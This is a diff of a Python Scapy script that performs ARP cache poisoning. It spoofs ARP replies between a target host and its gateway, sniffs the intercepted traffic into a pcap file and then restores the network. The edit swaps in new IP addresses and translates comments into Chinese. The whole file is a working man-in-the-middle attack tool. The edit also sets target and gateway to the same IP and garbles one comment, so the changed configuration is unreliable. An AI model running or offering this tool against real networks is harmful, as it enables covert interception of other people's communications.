@@ -4,14 +4,13 @@ import sys
 import threading
 
 interface    = "en1"
-target_ip    = "172.16.1.71"
-gateway_ip   = "172.16.1.254"
+target_ip    = "192.168.199.219"
+gateway_ip   = "192.168.199.219"
 packet_count = 1000
 poisoning    = True
     
 def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
     
-    # slightly different method using send
     print ("[*] Restoring target...")
     send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
@@ -20,7 +19,7 @@ def get_mac(ip_address):
     
     responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
     
-    # return the MAC address from a response
+    # 返回从响应数据中获取的MAC地址
     for s,r in responses:
         return r[Ether].src
     
@@ -53,10 +52,10 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
 
     return
 
-# set our interface
+# 设置嗅探的网卡
 conf.iface = interface
 
-# turn off output
+# 关闭输出
 conf.verb  = 0
 
 print ("[*] Setting up %s" % interface)
@@ -77,7 +76,7 @@ if target_mac is None:
 else:
     print ("[*] Target %s is at %s" % (target_ip,target_mac))
     
-# start poison thread
+# 启动ARP投毒线程
 poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))
 poison_thread.start()
 
@@ -91,15 +90,15 @@ except KeyboardInterrupt:
     pass
 
 finally:
-    # write out the captured packets
+    # 将捕获到的数据包输出到文件
     print ("[*] Writing packets to arper.pcap")
     wrpcap('arper.pcap',packets)
 
     poisoning = False
 
-    # wait for poisoning thread to exit
+    #  poisoning thread to exit
     time.sleep(2)
 
-    # restore the network
+    # 还原网络配置
     restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
     sys.exit(0)
